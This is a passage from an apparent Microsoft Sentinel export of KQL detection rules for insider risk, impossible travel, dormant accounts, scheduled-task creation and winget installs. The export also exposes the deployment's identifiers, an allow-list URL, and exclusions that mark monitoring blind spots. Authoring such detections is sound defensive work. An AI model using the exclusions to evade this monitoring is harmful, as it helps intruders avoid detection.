tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize PreviousIncidents = make_set(IncidentNumber) by UPN;\nlet LastTimeObserved =\nSecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize arg_max(TimeGenerated, IncidentName) by UPN;\n  SecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize count() by UPN, IncidentName, IncidentNumber, IncidentUrl, Severity, ProductName\n| extend SecurityIncidents = count_\n| where SecurityIncidents > 5 //Adjust & Tune within Organzational Requirements\n| join (LastTimeObserved) on UPN\n| project-rename LastObserved = TimeGenerated, LastIncident = IncidentNumber\n| project-away IncidentName, count_, UPN1, IncidentName1, Severity, IncidentUrl\n| join kind=inner (PreviousIncidents) on UPN\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UPN == $right.SearchKey\n| project UPN, SecurityIncidents, LastIncident, ProductName, LastObserved, PreviousIncidents\n| sort by SecurityIncidents desc\n| extend AccountCustomEntity = UPN\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"AccountCustomEntity"}]}],"templateVersion":"1.1.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1204"],"displayName":"Insider Risk_High User Security Incidents Correlation","enabled":false,"description":"This alert joins SecurityAlerts to SecurityIncidents to associate Security Alerts and Incidents with user accounts. This aligns all Microsoft Alerting Products with Microsoft Incident Generating Products (Microsoft Sentinel, M365 Defender) for a count of user security incidents over time. The default threshold is 5 security incidents, and this is customizable per the organization's requirements. Results include UserPrincipalName (UPN), SecurityIncident, LastIncident, ProductName, LastObservedTime, and Previous Incidents. There is an option for configuration of correlations against Microsoft Sentinel watchlists. For more information, see [Investigate incidents with Microsoft Sentinel]( https://docs.microsoft.com/azure/sentinel/investigate-cases).","alertRuleTemplateName":"28a75d10-9b75-4192-9863-e452c3ad24db","lastModifiedUtc":"2024-03-12T16:23:14.0999049Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8584a7bb-83b2-4eb1-918a-c78055acd34f","name":"8584a7bb-83b2-4eb1-918a-c78055acd34f","etag":"\"ed0002ae-0000-2700-0000-65f0821f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SigninLogs\n| where RiskState == \"atRisk\"\n| project UserPrincipalName, Location, AppDisplayName, RiskState\n| evaluate basket(0.01) // Adjust & Tune Thresholds within Organzational Requirements\n// | where Percent > 50 // Adjust & Tune Thresholds within Organzational Requirements\n| where UserPrincipalName <> \"\"\n| where AppDisplayName <> \"\"\n| project Percent, UserPrincipalName, Location, AppDisplayName, RiskState\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UserPrincipalName == $right.SearchKey\n| sort by Percent desc\n| extend AccountCustomEntity = UserPrincipalName\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]}],"templateVersion":"1.1.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1204"],"displayName":"Insider Risk_Risky User Access By Application","enabled":false,"description":"This alert evaluates Microsoft Entra ID Sign in risk via Machine Learning correlations in the basket operator. The basket threshold is adjustable, and the default is set to .01. There is an optional configuration to configure the percentage rates. The correlations are designed to leverage machine learning to identify patterns of risky user application access. There is an option for configuration of correlations against Microsoft Sentinel watchlists. For more information, see [Tutorial: Use risk detections for user sign-ins to trigger Microsoft Entra ID Multi-Factor Authentication or password changes](https://docs.microsoft.com/azure/active-directory/authentication/tutorial-risk-based-sspr-mfa)","alertRuleTemplateName":"15386bba-dc70-463f-a09f-d392e7731c63","lastModifiedUtc":"2024-03-12T16:26:07.5443164Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ec636999-9243-4dbd-8020-f1fa72733d8c","name":"ec636999-9243-4dbd-8020-f1fa72733d8c","etag":"\"ec0015df-0000-2700-0000-65f080830000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P7D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let AlertLinks = SecurityAlert\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize AlertLinks=make_set(AlertLink) by UPN;\nlet LastTimeObserved = SecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| project UPN, AlertName, Severity, ProductName, TimeGenerated | summarize arg_max(AlertName, Severity, ProductName, TimeGenerated) by UPN;\nSecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| project UPN, AlertName, Severity, ProductName\n| evaluate basket(0.001)\n| where UPN <> \"\"\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UPN == $right.SearchKey\n| project UPN, Percent, AlertName, Severity, ProductName\n| join (LastTimeObserved) on UPN\n| sort by Percent desc\n| extend LastObserved = TimeGenerated\n| join kind=inner (AlertLinks) on UPN\n| project UPN, AlertName, Severity, ProductName, Percent, LastObserved, AlertLinks\n| extend AccountCustomEntity = UPN\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"AccountCustomEntity"}]}],"templateVersion":"1.1.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1204"],"displayName":"Insider Risk_High User Security Alert Correlations","enabled":false,"description":"This alert joins SecurityAlerts from Microsoft Products with SecurityIncidents from Microsoft Sentinel and Microsoft Defender XDR. This join allows for identifying patterns in user principal names associated with respective security alerts. A machine learning function (Basket) is leveraged with a .001 threshold. Baset finds all frequent patterns of discrete attributes (dimensions) in the data. It returns the frequent patterns passed the frequency threshold. This query evaluates UserPrincipalName for patterns in SecurityAlerts and Reporting Security Tools. This query can be further tuned/configured for higher confidence percentages, security products, or alert severities pending the needs of the organization. There is an option for configuration of correlations against Microsoft Sentinel watchlists. For more information on the basket plugin, see [basket plugin](https://docs.microsoft.com/azure/data-explorer/kusto/query/basketplugin)","alertRuleTemplateName":"a4fb4255-f55b-4c24-b396-976ee075d406","lastModifiedUtc":"2024-03-12T16:19:15.8349613Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b7824ab7-b695-43a7-8095-ef02ac7f3b0d","name":"b7824ab7-b695-43a7-8095-ef02ac7f3b0d","etag":"\"8700a48f-0000-2700-0000-66fdc5130000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Ginna Woo, Edward Jiang\n// Description: Identify users connecting from different IP addresses. Based on the IP address geo-location, calculate the distance between the 2 locations. Using the timestamps for the connections from the two locations, estimate if it was possible to travel between the two locations within the calculated time difference AND if the speed is humanly possible. Max speed on commerical liner is around 1000 km, however, we increased the threshold to 1500 km/h. Discard any failed login attempts. Check signin activities against whitelist of VPN IPs. \n//Edge Cases: In some scenarios there will be 2 or more locations that a user recently travel to. This analytic only does a calc on the first two locations, ignoring additional locations (if applicable). There are discussions on potentially leveraging external options to perform these calculations on multiple locations using Python/Notebooks and referencing those notebooks in the analytic. \n// False Positives: None known\nlet maxSpeed = 1500; //Filter for speed over a specific threshold (i.e. 1500 km/hour ??? a bit over the 1000 km/hour average speed of a jet liner)\nlet minHours = 1; //THRESHOLD: Please adjust sensitivity threshold. The smaller the number is (i.e, 0.5) the more sensitive the analytic will be!\nlet minInvestigationPriority = 3; //THRESHOLD: Please adjust sensitivity threshold on a scale between 0-10\n// Grabs IP allow list from CSV\nlet allowList = \n    toscalar(\n        (externaldata(BCAP:string)[@\"https://dod365csspstorage.blob.core.usgovcloudapi.net/ueba/ip.csv\"] with (format=\"csv\", ignoreFirstRecord=True)) \n        | summarize make_list(BCAP)\n    );\nSigninLogs\n| where ResultType == \"0\" //discard any failed attempts to signin\n| extend latitude_ = todouble(parse_json(tostring(LocationDetails.geoCoordinates)).latitude)\n| extend longitude_ = todouble(parse_json(tostring(LocationDetails.geoCoordinates)).longitude)\n| extend countryOrRegion = tostring(LocationDetails.countryOrRegion)\n| extend state = tostring(LocationDetails.state)\n| extend location = strcat(state,' - ', countryOrRegion)\n| where location <> ' - '\n| extend browser = tostring(DeviceDetail.browser)\n| summarize Count=count(),// count the occurrence of login based on the associated data queried\n    IP=any(IPAddress), //Arbitrarily chooses an IP associated with specific coordinates\n    Last=max(TimeGenerated) by UserDisplayName, latitude_, longitude_, Locations=tostring(location), browser,AppDisplayName, UserPrincipalName, Location, state \n| extend coordinates = pack_array(latitude_,longitude_) //create array using Lat & Long\n| summarize coordinates=any(coordinates), ///Arbitrarily chooses a coordinate associated with specific lat/long\n    StateCountries=makeset(Locations),\n    Last=max(Last),//last login time & date\n    IP=tostring(any(IP)), //Arbitrarily chooses an IP associated with specific coordinates.\n    Apps=makeset(AppDisplayName),Browsers=makeset(browser), Locations=makeset(Locations) by UserDisplayName, UserPrincipalName, Location, state\n| where not(ipv4_is_in_any_range(IP,allowList)) //filters out any IP Addresses not in allowList.\n| summarize Coordinates=makeset(coordinates), \n    NumberOfStates=dcount(state), //count distinct location for # of different US States\n    NumberOfCountries=dcount(Location), //count distinct location for # of different countries\n    StateCountries=makeset(Locations), Timestamps=makeset(Last),IPs=makeset(IP),Apps=makeset(Apps),Browsers=makeset(Browsers) by UserDisplayName, UserPrincipalName\n| where NumberOfCountries > 1 or NumberOfStates > 1 //identifying users connecting from 2 or more locations \n//-------------Calculations:---------------------//\n//Calculate the distance between the two coordinates or locations and rounds it to the nearest km. \n| extend distance = round(geo_distance_2points(todouble(Coordinates[1]),todouble(Coordinates[0]),todouble(Coordinates[3]),todouble(Coordinates[2]))/1000,0) \n //Calculating the difference b/w two signin TimeStamps. This will tell us how long it took in hrs for a user to sign back in after reaching \"destination\"\n| extend hours = abs(todouble(datetime_diff('Minute', todatetime(Timestamps[1]),todatetime(Timestamps[0]))))/todouble(60) \n// Adjusted \"hours\" traveled to greater or equal to 1 hr - This is to see if travel is possible as coordinates does not give entirely accurate locations - so the smaller the threshold the noiser the analytic will be. This adjustment looks at any travel >= 1 allows us to reduce noise.\n| where hours >= minHours\n//Calculating the speed that the user is traveling in km using distance and hours calculated from above.\n| extend speedKmPerHour = round(distance/hours,0) \n//if speed is greater than the maxSpeed this indicates impossible travel  (maxSpeed = 1500 km/h - speed range greater than a commerical flight which is approx 1000km/h)\n| where speedKmPerHour > maxSpeed \n| project-reorder Timestamps, UserDisplayName, UserPrincipalName, IPs, speedKmPerHour, distance, hours, StateCountries, Apps, Browsers, StateCountries\n//Reformating IPs - cleaning\n| extend IPs = replace('[\\\\[|\\\\|\\\\\\\\|\"\\\\]]','',tostring(IPs))\n| join BehaviorAnalytics on UserPrincipalName\n| where InvestigationPriority >= minInvestigationPriority\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\")\n| extend DeviceUncommonlyUsedInTenant = column_ifexists(\"DeviceUncommonlyUsedInTenant\", \"\")\n| extend FirstTimeDeviceObservedInTenant = column_ifexists(\"FirstTimeDeviceObservedInTenant\", \"\")\n| extend FirstTimeUserAccessedResource = column_ifexists(\"FirstTimeUserAccessedResource\", \"\")\n| extend FirstTimeUserConnectedFromDevice = column_ifexists(\"FirstTimeUserConnectedFromDevice\", \"\")\n| extend FirstTimeUserConnectedViaBrowser = column_ifexists(\"FirstTimeUserConnectedViaBrowser\", \"\")\n| extend FirstTimeUserUsedApp = column_ifexists(\"FirstTimeUserUsedApp\", \"\")\n| extend ResourceUncommonlyAccessedInTenant = column_ifexists(\"ResourceUncommonlyAccessedInTenant\", \"\")\n| extend SimilarActionWasNotPerformedInThePast = column_ifexists(\"SimilarActionWasNotPerformedInThePast\", \"\")\n| extend UnusualNumberOfDistinctUsersFailedSignInFromIPAddress = column_ifexists(\"UnusualNumberOfDistinctUsersFailedSignInFromIPAddress\", \"\")\n| extend UnusualNumberOfFailedSignInOfThisUser = column_ifexists(\"UnusualNumberOfFailedSignInOfThisUser\", \"\")\n| extend UncommonHighVolumeOfActions = column_ifexists(\"UncommonHighVolumeOfActions\", \"\")\n| extend AppIdUncommonlyAccessedInTenant = column_ifexists(\"AppIdUncommonlyAccessedInTenant\", \"\")\n| extend BrowserUncommonlyUsedInTenant = column_ifexists(\"BrowserUncommonlyUsedInTenant\", \"\")\n| where DeviceUncommonlyUsedInTenant == 'True' or FirstTimeDeviceObservedInTenant == 'True' // impossible travel activity can be associated with new devices\n| summarize any(Timestamps), IPs=any(IPs), speedKmPerHour=any(speedKmPerHour), distance=any(distance), hours=any(hours), Apps=any(Apps), Browsers=any(Browsers), StateCountries=any(StateCountries), NumberOfStates=any(NumberOfStates), NumberOfCountries=any(NumberOfCountries), Coordinates=any(Coordinates), DeviceUncommonlyUsedInTenant=any(DeviceUncommonlyUsedInTenant), FirstTimeDeviceObservedInTenant=any(FirstTimeDeviceObservedInTenant), ResourceUncommonlyAccessedInTenant=any(ResourceUncommonlyAccessedInTenant), UnusualNumberOfDistinctUsersFailedSignInFromIPAddress=any(UnusualNumberOfDistinctUsersFailedSignInFromIPAddress), UnusualNumberOfFailedSignInOfThisUser=any(UnusualNumberOfFailedSignInOfThisUser), AppIdUncommonlyAccessedInTenant=any(AppIdUncommonlyAccessedInTenant), UncommonHighVolumeOfActions=any(UncommonHighVolumeOfActions), BrowserUncommonlyUsedInTenant=any(BrowserUncommonlyUsedInTenant), FirstTimeUserAccessedResource=any(FirstTimeUserAccessedResource), FirstTimeUserConnectedFromDevice=any(FirstTimeUserConnectedFromDevice), FirstTimeUserConnectedViaBrowser=any(FirstTimeUserConnectedViaBrowser), FirstTimeUserUsedApp=any(FirstTimeUserUsedApp), SimilarActionWasNotPerformedInThePast=any(SimilarActionWasNotPerformedInThePast), InvestigationPriority=any(InvestigationPriority) by UserPrincipalName, UserDisplayName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPs"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"BAH_UEBA_2-ImpossibleTravelIncidents","enabled":true,"description":"Identify users connecting from different IP addresses. Based on the IP address geo-location, calculate the distance between the 2 locations. Using the timestamps for the connections from the two locations, estimate if it was possible to travel between the two locations within the calculated time difference AND if the speed is humanly possible. Max speed on commerical liner is around 1000 km, however, we increased the threshold to 1500 km/h. Discard any failed login attempts. Check signin activities against whitelist of VPN IPs.\nPLATFORM:Azure AD,Windows,Microsoft 365,IaaS\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:11:26.3747994Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/42a16fef-e411-450b-90f4-189e6d73014f","name":"42a16fef-e411-450b-90f4-189e6d73014f","etag":"\"8700728e-0000-2700-0000-66fdc4f90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Ginna Woo\r\n// Description: Looks at dormant accounts (inactive accounts over 180 days) and the activities and risk events associated to those dormant accounts.\r\n// False Positives: None known\r\nlet AL = (AuditLogs\r\n    | join SigninLogs on ResourceId, CorrelationId\r\n    | extend ActivityDateTimeAL = ActivityDateTime\r\n    | extend TimeGeneratedAL = TimeGenerated\r\n    | where ResultType1 == 0 and IPAddress !startswith \"140\" //successful sign in and if IPAddress sign-in is not from 140.xxx.xxx\r\n    | extend InitiatedByUser = InitiatedBy.user.userPrincipalName\r\n    | extend InitiatedByApp = InitiatedBy.app.servicePrincipalName\r\n    | extend TargetedResource = TargetResources[0].displayName\r\n    | extend TargetedUser = TargetResources[0].userPrincipalName\r\n    | extend TargetedResourceProperties = TargetResources[0].modifiedProperties\r\n| project Category, AADOperationType, ActivityDisplayName, OperationName,InitiatedByUser, InitiatedByApp, TargetedResource, TargetedUser, ActivityDateTimeAL, UserPrincipalName,TimeGeneratedAL, IPAddress, TargetedResourceProperties, AdditionalDetails);\r\nBehaviorAnalytics\r\n| where InvestigationPriority >= 0 //adjust sensitivity level on scale 0-10 (10 highest)\r\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\")\r\n| evaluate bag_unpack(UsersInsights, columnsConflict=\"replace_source\")\r\n| extend IsDormantAccount = column_ifexists(\"IsDormantAccount\", \"\")\r\n| extend IsNewAccount = column_ifexists(\"IsNewAccount\", \"\")\r\n| extend Resource = column_ifexists(\"Resource\", \"\")\r\n| extend DeviceUncommonlyUsedInTenant = column_ifexists(\"DeviceUncommonlyUsedInTenant\", \"\")\r\n| extend FirstTimeDeviceObservedInTenant = column_ifexists(\"FirstTimeDeviceObservedInTenant\", \"\")\r\n| extend FirstTimeUserAccessedResource = column_ifexists(\"FirstTimeUserAccessedResource\", \"\")\r\n| extend FirstTimeUserUsedApp = column_ifexists(\"FirstTimeUserUsedApp\", \"\")\r\n| extend ActionUncommonlyPerformedByUser = column_ifexists(\"ActionUncommonlyPerformedByUser\", \"\")\r\n| extend ResourceUncommonlyAccessedInTenant = column_ifexists(\"ResourceUncommonlyAccessedInTenant\", \"\")\r\n| extend UnusualNumberOfDistinctUsersFailedSignInFromIPAddress = column_ifexists(\"UnusualNumberOfDistinctUsersFailedSignInFromIPAddress\", \"\")\r\n| extend UnusualNumberOfFailedSignInOfThisUser = column_ifexists(\"UnusualNumberOfFailedSignInOfThisUser\", \"\")\r\n| extend UncommonHighVolumeOfActions = column_ifexists(\"UncommonHighVolumeOfActions\", \"\")\r\n| extend AppIdUncommonlyAccessedInTenant = column_ifexists(\"AppIdUncommonlyAccessedInTenant\", \"\")\r\n| extend AccountDisplayName = column_ifexists(\"AccountDisplayName\", \"\")\r\n| where IsDormantAccount == True // only include accounts not in use for > 180 days\r\n| join kind=inner AL on UserPrincipalName\r\n| summarize min(TimeGenerated), max(TimeGenerated) by UserPrincipalName, AADOperationType,Category,OperationName,InvestigationPriority,ActionUncommonlyPerformedByUser,UncommonHighVolumeOfActions,UnusualNumberOfFailedSignInOfThisUser,UnusualNumberOfDistinctUsersFailedSignInFromIPAddress,AppIdUncommonlyAccessedInTenant, FirstTimeDeviceObservedInTenant, FirstTimeUserAccessedResource, FirstTimeUserUsedApp, ResourceUncommonlyAccessedInTenant,IsDormantAccount, IPAddress, tostring(InitiatedByUser), tostring(InitiatedByApp), tostring(TargetedUser),tostring(TargetedResource), tostring(TargetedResourceProperties), tostring(AdditionalDetails)\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"BAH_UEBA_3-RiskyDormantAccountActivities","enabled":true,"description":"Looks at dormant accounts (inactive accounts over 180 days) and the activities and risk events associated to those dormant accounts.\nPLATFORM:Azure AD,Windows,Microsoft 365,IaaS\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:10:51.2018956Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/82f90c07-d334-4dea-a3ed-c3d2e4112dc9","name":"82f90c07-d334-4dea-a3ed-c3d2e4112dc9","etag":"\"87009bf2-0000-2700-0000-66fdcb9e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Steven Wan\n//Description: This analytic looks for any creation of scheduled tasks that were not completed by the system account.\n//False Positives: None known\nlet nessus_regex = \"nessus_[A-Z0-9]{8}\";\nDeviceProcessEvents\n| where FileName == \"schtasks.exe\"\n| where ActionType == \"ProcessCreated\"\n| where AccountName != \"system\"\n| where countof(InitiatingProcessCommandLine, nessus_regex, \"regex\") != 3\n| project TimeGenerated, AccountName, DeviceName, ActionType, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"AccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1053"],"displayName":"BAH_Defender-TaskScheduleCreation","enabled":false,"description":"This analytic looks for any creation of scheduled tasks that were not completed by the system account.\nPLATFORM:Windows\nMITRE:TA0003;T1053","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:39:25.9362803Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/04433ccf-e512-44a9-85ed-69d36f049560","name":"04433ccf-e512-44a9-85ed-69d36f049560","etag":"\"bc0095fc-0000-2700-0000-653a6a4d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_Defender-Windows_Store_Apps\n//Author: Michael Gibbs, Steven Wan\n//Description: Detects on Windows Store application installation attempts through usage of the 'winget' command. Previously this analytic was purposed to detect on any or all installations of applications through the Windows store for any false positives or legitimate hits. This will be able to detect on attempts through either Microsoft Store via cmd or PS.\n//False Positives: Not applicable at this time.\n\nDeviceProcessEvents\n| where ((ProcessCommandLine contains \"winget\"\nand ProcessCommandLine contains \"install\" \nand 